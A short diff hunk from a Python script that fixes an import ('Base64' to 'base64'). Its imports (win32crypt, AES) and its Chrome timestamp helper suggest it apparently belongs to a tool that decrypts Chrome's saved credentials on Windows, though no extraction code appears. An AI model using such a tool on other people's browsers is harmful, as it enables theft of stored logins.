@@ -22,7 +22,7 @@ import win32crypt
 from Crypto.Cipher import AES
 import shutil
 from datetime import datetime
-import Base64
+import base64
 
 def get_chrome_datetime(chromedate):
     return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)
